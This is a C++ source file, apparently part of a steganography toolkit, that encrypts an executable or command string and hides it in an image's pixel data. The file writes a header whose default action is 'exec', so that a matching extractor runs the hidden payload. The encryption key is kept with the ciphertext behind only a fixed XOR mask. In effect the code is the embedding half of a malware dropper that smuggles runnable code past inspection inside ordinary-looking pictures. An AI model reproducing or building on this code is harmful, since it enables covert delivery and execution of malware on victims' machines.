#include "stego_common.hpp"
#include <iostream>
#include <map>

using namespace std;
using namespace cv;
using namespace Stego;

void print_usage() {
    cout << "Usage: ./embed -img <src_image> -out <out_image> [options]\n\n";
    cout << "Options:\n";
    cout << "  -payload <file/string>  File path or command string\n";
    cout << "  -ptype   <exe|cmd>      Payload type (Default: exe)\n";
    cout << "  -algo    <aes|des>      Encryption Algo (Default: aes)\n";
    cout << "  -mode    <ecb|cbc|cfb|ofb> Block Mode (Default: cbc)\n";
    cout << "  -pad     <pkcs7|zero>   Padding Scheme (Default: pkcs7)\n";
    cout << "  -hash    <md5|sha1|sha256> Integrity Hash (Default: sha256)\n";
    cout << "  -act     <write|exec>   Action upon extraction (Default: exec)\n";
}

// 讀取檔案
vector<uint8_t> read_file(const string& path) {
    ifstream file(path, ios::binary);
    if (!file) throw runtime_error("File not found: " + path);
    return vector<uint8_t>((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
}

int main(int argc, char** argv) {
    if (argc < 5) {
        print_usage();
        return 1;
    }

    // 1. 參數解析 defaults
    string src_path, out_path, payload_input;
    Header header;
    memset(&header, 0, sizeof(Header));
    memcpy(header.magic, "STG2", 4); // 更新 Magic Number
    
    // Defaults
    header.algo = ALGO_AES;
    header.mode = MODE_CBC;
    header.padding = PAD_PKCS7;
    header.hash_type = HASH_SHA256;
    header.payload_type = PAYLOAD_EXE;
    header.action = ACT_EXECUTE;

    for (int i = 1; i < argc; i++) {
        string arg = argv[i];
        if (i + 1 >= argc) break; 
        
        if (arg == "-img") src_path = argv[++i];
        else if (arg == "-out") out_path = argv[++i];
        else if (arg == "-payload") payload_input = argv[++i];
        else if (arg == "-ptype") {
            string v = argv[++i];
            header.payload_type = (v == "cmd") ? PAYLOAD_CMD : PAYLOAD_EXE;
        }
        else if (arg == "-algo") {
            string v = argv[++i];
            header.algo = (v == "des") ? ALGO_DES : ALGO_AES;
        }
        else if (arg == "-mode") {
            string v = argv[++i];
            if (v == "ecb") header.mode = MODE_ECB;
            else if (v == "cfb") header.mode = MODE_CFB;
            else if (v == "ofb") header.mode = MODE_OFB;
            else header.mode = MODE_CBC;
        }
        else if (arg == "-pad") {
            string v = argv[++i];
            header.padding = (v == "zero") ? PAD_ZERO : PAD_PKCS7;
        }
        else if (arg == "-hash") {
            string v = argv[++i];
            if (v == "md5") header.hash_type = HASH_MD5;
            else if (v == "sha1") header.hash_type = HASH_SHA1;
            else header.hash_type = HASH_SHA256;
        }
        else if (arg == "-act") {
            string v = argv[++i];
            header.action = (v == "write") ? ACT_WRITE : ACT_EXECUTE;
        }
    }

    if (src_path.empty() || out_path.empty() || payload_input.empty()) {
        cerr << "[-] Missing required arguments (-img, -out, -payload)" << endl;
        return 1;
    }

    try {
        Mat img = imread(src_path);
        if (img.empty()) throw runtime_error("Failed to load source image");

        // 2. 準備 Payload
        vector<uint8_t> payload_data;
        if (header.payload_type == PAYLOAD_CMD) {
            payload_data.assign(payload_input.begin(), payload_input.end());
        } else {
            payload_data = read_file(payload_input);
        }
        header.original_size = payload_data.size();

        // 3. 生成 Keys
        vector<uint8_t> xor_val = { 0xDE, 0xAD, 0xBE, 0xEF }; // 這裡可以隨機生成
        vector<uint8_t> sym_key(32); // AES max
        if (header.algo == ALGO_DES) sym_key.resize(8);
        
        vector<uint8_t> iv(16); // AES block
        if (header.algo == ALGO_DES) iv.resize(8);

        RAND_bytes(sym_key.data(), sym_key.size());
        RAND_bytes(iv.data(), iv.size());

        header.xor_val_len = xor_val.size();
        header.key_len = sym_key.size();
        header.iv_len = iv.size();

        // 4. 加密 Payload (傳入選定的 Algo, Mode, Padding)
        vector<uint8_t> enc_payload = symmetric_crypt(payload_data, sym_key, iv, true, 
                                                     header.algo, header.mode, header.padding);
        header.payload_size = enc_payload.size();

        // 5. XOR Key
        vector<uint8_t> xored_key = sym_key;
        xor_data(xored_key, xor_val);

        // 6. 組合封包
        vector<uint8_t> full_data;
        uint8_t* p_header = reinterpret_cast<uint8_t*>(&header);
        full_data.insert(full_data.end(), p_header, p_header + sizeof(Header));
        full_data.insert(full_data.end(), xor_val.begin(), xor_val.end());
        full_data.insert(full_data.end(), xored_key.begin(), xored_key.end());
        full_data.insert(full_data.end(), iv.begin(), iv.end());
        full_data.insert(full_data.end(), enc_payload.begin(), enc_payload.end());

        // 7. Hash
        vector<uint8_t> hash = calculate_hash(full_data, header.hash_type);
        full_data.insert(full_data.end(), hash.begin(), hash.end());

        // 8. 寫入圖片
        cout << "[*] Embedding " << full_data.size() << " bytes..." << endl;
        cout << "    Algo: " << (header.algo ? "DES" : "AES") << " | Mode: " << (int)header.mode 
             << " | Pad: " << (header.padding ? "ZERO" : "PKCS7") << endl;
        
        embed_to_image(img, full_data);
        imwrite(out_path, img);
        cout << "[+] Success! Output saved to " << out_path << endl;

    } catch (const exception& e) {
        cerr << "[-] Error: " << e.what() << endl;
        return 1;
    }
    return 0;
}